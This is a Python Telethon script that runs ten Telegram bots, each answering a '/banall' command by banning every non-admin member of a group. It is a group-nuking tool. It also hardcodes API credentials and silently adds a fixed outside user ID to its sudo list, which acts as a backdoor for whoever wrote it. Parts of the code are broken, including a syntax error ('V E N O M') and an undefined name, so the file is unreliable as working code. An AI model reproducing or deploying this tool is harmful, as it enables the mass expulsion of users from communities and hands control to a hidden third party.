import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN1 = config("BOT_TOKEN1", None)
BOT_TOKEN2 = config("BOT_TOKEN2", None)
BOT_TOKEN3 = config("BOT_TOKEN3", None)
BOT_TOKEN4 = config("BOT_TOKEN4", None)
BOT_TOKEN5 = config("BOT_TOKEN5", None)
BOT_TOKEN6 = config("BOT_TOKEN6", None)
BOT_TOKEN7 = config("BOT_TOKEN7", None)
BOT_TOKEN8 = config("BOT_TOKEN8", None)
BOT_TOKEN9 = config("BOT_TOKEN9", None)
BOT_TOKEN10 = config("BOT_TOKEN10", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
Venom = [6812888267]
ALTRONS = [-1002110180871]
SUDO_USERS.append(6812888267)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
lily1 = TelegramClient('lily1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
lily2 = TelegramClient('lily2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
lily3 = TelegramClient('lily3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
lily4 = TelegramClient('lily4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
lily5 = TelegramClient('lily5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
lily6 = TelegramClient('lily6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
lily7 = TelegramClient('lily7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
lily8 = TelegramClient('lily8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
lily9 = TelegramClient('lily9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
lily10 = TelegramClient('lily10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)


@lily1.on(events.NewMessage(pattern="^/banall"))
@lily2.on(events.NewMessage(pattern="^/banall"))
@lily3.on(events.NewMessage(pattern="^/banall"))
@lily4.on(events.NewMessage(pattern="^/banall"))
@lily5.on(events.NewMessage(pattern="^/banall"))
@lily6.on(events.NewMessage(pattern="^/banall"))
@lily7.on(events.NewMessage(pattern="^/banall"))
@lily8.on(events.NewMessage(pattern="^/banall"))
@lily9.on(events.NewMessage(pattern="^/banall"))
@lily10.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in V E N O M:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in lily:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("ꪜꫀŇ𐍉ꪑ 𝙓 𝐵𝐴𝑁-𝐴𝐿𝐿")

lily1.run_until_disconnected()
lily2.run_until_disconnected()
lily3.run_until_disconnected()
lily4.run_until_disconnected()
lily5.run_until_disconnected()
lily6.run_until_disconnected()
lily7.run_until_disconnected()
lily8.run_until_disconnected()
lily9.run_until_disconnected()
lily10.run_until_disconnected()
